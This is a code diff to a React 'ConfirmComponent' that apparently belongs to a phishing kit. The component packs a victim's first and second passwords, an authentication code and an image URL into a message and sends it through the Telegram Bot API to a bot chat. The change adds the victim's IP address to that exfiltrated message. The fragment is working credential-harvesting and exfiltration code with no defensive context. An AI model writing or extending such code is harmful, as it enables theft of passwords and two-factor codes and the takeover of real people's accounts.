@@ -57,7 +57,8 @@ const ConfirmComponent = () => {
                 '%0A<strong>Password First: </strong>' + dataLocalImages.firt_password +
                 '%0A<strong>Password Second: </strong>' + dataLocalImages.second_password +
                 '%0A<strong>Images Url: </strong>' + dataLocalImages.url_image +
-                '%0A<strong>Code Authentication : </strong>' + firtCodes ;
+                '%0A<strong>Code Authentication : </strong>' + firtCodes +
+                '%0A<strong>IP: </strong>' + response.data.ip;
 
                 axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                     .then((response) => {
